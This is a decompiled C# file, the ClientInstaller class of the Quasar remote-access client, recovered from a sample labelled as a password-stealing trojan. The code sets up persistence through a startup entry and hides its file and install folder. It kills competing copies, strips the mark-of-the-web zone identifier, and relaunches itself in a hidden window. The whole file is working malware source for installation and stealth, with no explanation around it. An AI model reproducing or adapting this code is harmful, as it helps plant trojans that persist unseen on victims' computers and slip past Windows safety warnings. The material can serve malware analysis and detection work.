// Decompiled with JetBrains decompiler
// Type: Quasar.Client.Setup.ClientInstaller
// Assembly: Client, Version=1.4.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 73C3C7FC-0EA2-48C4-8CEF-33A8CFDA287C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-PSW.MSIL.Agent.anew-0b84e664c8b592aa0220d52841629b2accb41f1f624720331000ab5f2f0ed628.exe

using Quasar.Client.Config;
using Quasar.Client.Extensions;
using Quasar.Common.Helpers;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace Quasar.Client.Setup
{
  public class ClientInstaller : ClientSetupBase
  {
    public void ApplySettings()
    {
      if (Settings.STARTUP)
        new ClientStartup().AddToStartup(Application.ExecutablePath, Settings.STARTUPKEY);
      if (Settings.INSTALL)
      {
        if (Settings.HIDEFILE)
        {
          try
          {
            File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden);
          }
          catch (Exception ex)
          {
          }
        }
      }
      if (!Settings.INSTALL || !Settings.HIDEINSTALLSUBDIRECTORY)
        return;
      if (string.IsNullOrEmpty(Settings.SUBDIRECTORY))
        return;
      try
      {
        new DirectoryInfo(Path.GetDirectoryName(Settings.INSTALLPATH)).Attributes |= FileAttributes.Hidden;
      }
      catch (Exception ex)
      {
      }
    }

    public void Install()
    {
      if (!Directory.Exists(Path.GetDirectoryName(Settings.INSTALLPATH)))
        Directory.CreateDirectory(Path.GetDirectoryName(Settings.INSTALLPATH));
      if (File.Exists(Settings.INSTALLPATH))
      {
        try
        {
          File.Delete(Settings.INSTALLPATH);
        }
        catch (Exception ex)
        {
          switch (ex)
          {
            case IOException _:
            case UnauthorizedAccessException _:
              Process[] processesByName = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(Settings.INSTALLPATH));
              int id = Process.GetCurrentProcess().Id;
              foreach (Process proc in processesByName)
              {
                if (proc.Id != id && !(proc.GetMainModuleFileName() != Settings.INSTALLPATH))
                {
                  proc.Kill();
                  Thread.Sleep(2000);
                  break;
                }
              }
              break;
          }
        }
      }
      File.Copy(Application.ExecutablePath, Settings.INSTALLPATH, true);
      this.ApplySettings();
      FileHelper.DeleteZoneIdentifier(Settings.INSTALLPATH);
      Process.Start(new ProcessStartInfo()
      {
        WindowStyle = ProcessWindowStyle.Hidden,
        CreateNoWindow = true,
        UseShellExecute = false,
        FileName = Settings.INSTALLPATH
      });
    }
  }
}
